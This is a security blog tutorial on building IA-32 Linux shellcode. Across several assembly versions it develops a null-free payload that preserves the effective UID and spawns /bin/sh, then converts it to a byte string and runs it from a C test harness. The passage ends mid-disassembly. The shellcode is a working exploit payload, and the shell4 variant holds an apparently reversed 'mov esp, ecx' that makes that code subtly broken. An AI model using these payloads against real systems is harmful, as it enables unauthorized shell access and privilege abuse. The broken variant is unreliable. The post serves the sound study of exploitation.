
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>IA-32 Linux Shellcode Basics 2 - 0x73696e65</title>
  <meta name="author" content="Norbert Szetei">

  
  <meta name="description" content="Starting with the ASM code that is position dependent: shell1.asm 1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
section .data
cmd db &#39;/bin/sh&#39;,0x0 &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://73696e65.github.io/blog/2015/06/26/ia-32-linux-shellcode-basics-2/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="0x73696e65" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-64260520-1']);
    _gaq.push(['_setDomainName','github.io']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body    class="collapse-sidebar sidebar-footer" >
  <header role="banner"><hgroup>
  <h1><a href="/">0x73696e65</a></h1>
  
    <h2>information security notes</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="73696e65.github.io">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">IA-32 Linux Shellcode Basics 2</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-26T11:08:30+02:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:08 am</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>Starting with the ASM code that is position dependent:</p>

<figure class='code'><figcaption><span>shell1.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
</span><span class='line'><span class="nf">cmd</span> <span class="no">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0x0</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">lea</span> <span class="no">ebx</span><span class="p">,</span> <span class="err">[</span><span class="no">cmd</span><span class="err">]</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ecx</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">0</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell1.asm; ld shell1.o -o shell1
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./shell1 
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell1
</span><span class='line'>
</span><span class='line'>shell1:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048080 &lt;_start>:
</span><span class='line'> 8048080: b8 0b 00 00 00          mov    eax,0xb
</span><span class='line'> 8048085: 8d 1d 9c 90 04 08       lea    ebx,ds:0x804909c
</span><span class='line'> 804808b: b9 00 00 00 00          mov    ecx,0x0
</span><span class='line'> 8048090: 51                      push   ecx
</span><span class='line'> 8048091: 53                      push   ebx
</span><span class='line'> 8048092: 89 e1                   mov    ecx,esp
</span><span class='line'> 8048094: ba 00 00 00 00          mov    edx,0x0
</span><span class='line'> 8048099: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>


<p>The minimalistic shell could look like <code>execve("/bin/sh", NULL, NULL)</code>.
However, according documentation it&rsquo;s not portable among UNIX systems:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>man 2 execve
</span><span class='line'>
</span><span class='line'>  On Linux, argv can be specified as NULL, which has the same effect as
</span><span class='line'>  specifying this argument as a pointer to a list containing a single NULL
</span><span class='line'>  pointer.  Do not take advantage of this  misfea‚Äê ture!  It is nonstandard and
</span><span class='line'>  nonportable: on most other UNIX systems doing this will result in an error
</span><span class='line'>  (EFAULT).</span></code></pre></td></tr></table></div></figure>


<p>Again, the same procedure. We need to get rid of absolute address reference and
NULL bytes.</p>

<figure class='code'><figcaption><span>shell2.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="err">&#39;</span><span class="no">n</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span>
</span><span class='line'><span class="nf">push</span> <span class="err">&#39;//</span><span class="no">bi</span><span class="err">&#39;</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span> <span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'>
</span><span class='line'><span class="nf">mov</span>  <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell2.asm; ld shell2.o -o shell2
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./shell2 
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>


<p>Before we dump our opcodes, we add <code>setreuid(geteuid(), geteuid()</code> call:</p>

<figure class='code'><figcaption><span>shell3.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span> <span class="nf">geteuid</span>
</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">49</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span> <span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span> <span class="no">geteuid</span><span class="p">()</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">70</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="err">&#39;</span><span class="no">n</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span>
</span><span class='line'><span class="nf">push</span> <span class="err">&#39;//</span><span class="no">bi</span><span class="err">&#39;</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span> <span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'>
</span><span class='line'><span class="nf">mov</span>  <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell3.asm; ld shell3.o -o shell3
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./shell3</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell3
</span><span class='line'>
</span><span class='line'>shell3:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048060 &lt;_start>:
</span><span class='line'> 8048060: 6a 31                   push   0x31
</span><span class='line'> 8048062: 58                      pop    eax
</span><span class='line'> 8048063: cd 80                   int    0x80
</span><span class='line'> 8048065: 89 c3                   mov    ebx,eax
</span><span class='line'> 8048067: 89 c1                   mov    ecx,eax
</span><span class='line'> 8048069: 6a 46                   push   0x46
</span><span class='line'> 804806b: 58                      pop    eax
</span><span class='line'> 804806c: cd 80                   int    0x80
</span><span class='line'> 804806e: 31 c0                   xor    eax,eax
</span><span class='line'> 8048070: 31 d2                   xor    edx,edx
</span><span class='line'> 8048072: 50                      push   eax
</span><span class='line'> 8048073: 68 6e 2f 73 68          push   0x68732f6e
</span><span class='line'> 8048078: 68 2f 2f 62 69          push   0x69622f2f
</span><span class='line'> 804807d: 89 e3                   mov    ebx,esp
</span><span class='line'> 804807f: 50                      push   eax
</span><span class='line'> 8048080: 53                      push   ebx
</span><span class='line'> 8048081: 89 e1                   mov    ecx,esp
</span><span class='line'> 8048083: b0 0b                   mov    al,0xb
</span><span class='line'> 8048085: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>


<p>Analogously as before:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
</span><span class='line'>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sc=$(objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d '')
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# echo $sc | ruby -e 'print $stdin.read.scan(/\\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join' > shellcode</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;sys/mman.h>
</span><span class='line'>#include &lt;string.h>
</span><span class='line'>#include &lt;stdio.h>
</span><span class='line'>
</span><span class='line'>char sc[]= "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
</span><span class='line'>
</span><span class='line'>int main(){
</span><span class='line'>        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); 
</span><span class='line'>        printf("allocated executable memory at: %p\n", a); 
</span><span class='line'>        printf("shellcode length: %d\n", strlen(sc)); 
</span><span class='line'>        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# gcc test.c -o test
</span><span class='line'>root@kali32:/tmp# ./test 
</span><span class='line'>allocated executable memory at: 0xb76f7000
</span><span class='line'>shellcode length: 39
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>


<p>Alternatively we can obtain string reference with <code>call</code> instruction:</p>

<figure class='code'><figcaption><span>shell4.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span> <span class="nf">geteuid</span>
</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">49</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span> <span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span> <span class="no">geteuid</span><span class="p">()</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">70</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span><span class="err">;</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>
</span><span class='line'><span class="nf">jmp</span> <span class="no">short</span> <span class="no">string_loc</span>
</span><span class='line'>
</span><span class='line'><span class="nl">string_loc_ret:</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">mov</span> <span class="err">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">7</span><span class="err">]</span><span class="p">,</span> <span class="no">cl</span> <span class="err">;</span> <span class="no">rewrite</span> <span class="no">N</span> <span class="no">with</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">edx</span><span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span><span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">esp</span><span class="p">,</span> <span class="no">ecx</span>
</span><span class='line'>
</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="nl">string_loc:</span>
</span><span class='line'><span class="nf">call</span> <span class="no">string_loc_ret</span> <span class="err">;</span> <span class="no">this</span> <span class="no">put</span> <span class="no">the</span> <span class="p">(</span><span class="no">return</span><span class="p">)</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">string</span> <span class="no">to</span> <span class="no">the</span> <span class="no">top</span> <span class="no">of</span> <span class="no">the</span> <span class="no">stack</span>
</span><span class='line'><span class="nf">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">shN</span><span class="err">&#39;</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell4.asm; ld shell4.o -o shell4
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./shell4
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>


<p>The segfault is normal and it&rsquo;s because we are trying to overwrite the code
segment at the line <code>mov BYTE PTR [ebx+0x7],cl</code>. Because our shellcode will be
loaded on stack, that doesn&rsquo;t mean any complication.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell4
</span><span class='line'>
</span><span class='line'>shell4:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048060 &lt;_start>:
</span><span class='line'> 8048060: 6a 31                   push   0x31
</span><span class='line'> 8048062: 58                      pop    eax
</span><span class='line'> 8048063: cd 80                   int    0x80
</span><span class='line'> 8048065: 89 c3                   mov    ebx,eax
</span><span class='line'> 8048067: 89 c1                   mov    ecx,eax
</span><span class='line'> 8048069: 6a 46                   push   0x46
</span><span class='line'> 804806b: 58                      pop    eax
</span><span class='line'> 804806c: cd 80                   int    0x80
</span><span class='line'> 804806e: 31 c0                   xor    eax,eax
</span><span class='line'> 8048070: 31 c9                   xor    ecx,ecx
</span><span class='line'> 8048072: 31 d2                   xor    edx,edx
</span><span class='line'> 8048074: eb 0c                   jmp    8048082 &lt;string_loc>
</span><span class='line'>
</span><span class='line'>08048076 &lt;string_loc_ret>:
</span><span class='line'> 8048076: 5b                      pop    ebx
</span><span class='line'> 8048077: 88 4b 07                mov    BYTE PTR [ebx+0x7],cl
</span><span class='line'> 804807a: 52                      push   edx
</span><span class='line'> 804807b: 53                      push   ebx
</span><span class='line'> 804807c: 89 cc                   mov    esp,ecx
</span><span class='line'> 804807e: b0 0b                   mov    al,0xb
</span><span class='line'> 8048080: cd 80                   int    0x80
</span><span class='line'>
</span><span class='line'>08048082 &lt;string_loc>:
</span><span class='line'> 8048082: e8 ef ff ff ff          call   8048076 &lt;string_loc_ret>
</span><span class='line'> 8048087: 2f                      das    
</span><span class='line'> 8048088: 62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
</span><span class='line'> 804808b: 2f                      das    
